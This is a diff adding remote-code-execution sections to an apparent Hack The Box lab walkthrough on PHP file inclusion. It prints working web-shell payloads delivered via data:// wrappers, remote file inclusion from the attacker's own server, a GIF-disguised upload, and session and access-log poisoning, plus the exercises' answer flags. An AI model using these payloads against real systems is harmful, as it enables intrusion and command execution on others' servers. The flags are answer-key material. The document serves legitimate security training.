@@ -5,6 +5,11 @@
     1. [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
     2. [Basic Bypasses](#basic-bypasses)
     3. [PHP Filters](#php-filters)
+2. [Remote Code Execution](#remote-code-execution)
+    1. [PHP Wrappers](#php-wrappers)
+    2. [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
+    3. [LFI and File Uploads](#lfi-and-file-uploads)
+    4. [Log Poisoning](#log-poisoning)
 
 ## File Disclosure
 ### Local File Inclusion (LFI)
@@ -65,3 +70,111 @@
     ```
 
     The answer is `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}`.
+
+## Remote Code Execution
+### PHP Wrappers
+#### Challenges
+1. Try to gain RCE using one of the PHP wrappers and read the flag at /
+
+    To solve this, first we need to make sure that PHP Configurations (allow_url_include) is enabled.
+
+    ```bash
+    curl "http://94.237.123.236:51805/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+    ```
+
+    We can copy the base64 output and decode it by using this command:
+
+    ```bash
+    echo '<base64>' | base64 -d | grep allow_url_include
+    ```
+
+    ![alt text](<Assets/PHP Wrappers - 1.png>)
+
+    We can see that allow_url_include is enabled. Now, we can use data:// wrapper to execute command. Here the command to find the flag:
+
+    ```bash
+    curl -s 'http://94.237.123.236:51805/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls%20%2F'
+    ```
+    We will find the flag at `/37809e2f8952f06139011994726d9ef1.txt`. Then, we can use this command to get the flag:
+
+    ```bash 
+    curl -s 'http://94.237.123.236:51805/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20%2F37809e2f8952f06139011994726d9ef1.txt'
+    ```
+    The answer is **HTB{d!$46l3_r3m0t3_url_!nclud3}**.
+
+### Remote File Inclusion (RFI)
+#### Challenges
+1. Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /
+
+    First, we need to create the payload.
+
+    ```bash
+    echo '<?php system($_GET["cmd"]); ?>' > shell.php
+    ```
+    Then, we need to start a web server.
+
+    ```bash
+    python3 -m http.server 443 --bind 10.10.15.105
+    ```
+    After doing some exploration, we can find the flag at `/exercise/flag.txt`. Here the command to read the flag:
+
+    ```bash
+    curl 'http://10.129.29.114/index.php?language=http://10.10.15.105:443/shell.php&cmd=cat%20%2Fexercise%2Fflag.txt'
+    ```
+    The answer is **99a8fc05f033f2fc0cf9a6f9826f83f4**.
+
+### LFI and File Uploads
+#### Challenges
+1. Use any of the techniques covered in this section to gain RCE and read the flag at /
+
+    We can solve this by uploading our shellcode into our profile picture with GIF format. Here the payload:
+
+    ```bash
+    echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+    ```
+    Then, after doing some exploration, we can find the flag at `/2f40d853e2d4768d87da1c81772bae0a.txt`. Here the command to read the flag:
+
+    ```bash
+    curl 'http://94.237.120.137:34149/index.php?language=./profile_images/shell.gif&cmd=cat%20%2F2f40d853e2d4768d87da1c81772bae0a.txt'
+    ```
+    The answer is **HTB{upl04d+lf!+3x3cut3=rc3}**.
+
+### Log Poisoning
+#### Challenges
+1. Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd
+
+    We can solve this by using session poisoning. First, we need to find value of our session id. In here, my session id is **sess_kqbgtugharvo8jb8u1khf39r0j**. Then we can view it is content by using this url:
+
+    ```bash
+    http://83.136.252.32:50354/index.php?language=/var/lib/php/sessions/sess_kqbgtugharvo8jb8u1khf39r0j
+    ```
+    ![alt text](<Assets/Log Poisoning - 1.png>)
+        
+    We can see that the website took whatever we typed in **?language=** and wrote it directly into this file on the hard drive. We can test it by changing the **?language=** to whatever we want. For example, we can change it to **<?php system($_GET["cmd"]); ?>** to execute command.
+
+    ```bash
+    http://83.136.252.32:50354/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+    ```
+    Then, we can view the content of the file by using this url:
+
+    ```bash
+    http://83.136.252.32:50354/index.php?language=/var/lib/php/sessions/sess_kqbgtugharvo8jb8u1khf39r0j&cmd=pwd
+    ```
+
+    The answer is **/var/www/html**.
+
+2. Try to use a different technique to gain RCE and read the flag at /
+
+    We can solve this by using log poisoning. We can intercept the request with burp suite and look the result of changing language to **language=/var/log/apache2/access.log**.
+
+    ![alt text](<Assets/Log Poisoning - 2.png>)
+    
+    As we can see that we can read the content of access.log. We can try to inject our payload into the log file by changing the **User-Agent** section to **<?php system($_GET["cmd"]); ?>**.
+
+    ![alt text](<Assets/Log Poisoning - 3.png>)
+
+    Now, access.log should be contain our payload. We can use LFI to gain RCE.
+
+    ![alt text](<Assets/Log Poisoning - 4.png>)
+
+    We can see the name of the flag file. We can cat it and get the flag. The answer is **HTB{1095_5#0u1d_n3v3r_63_3xp053d}**.
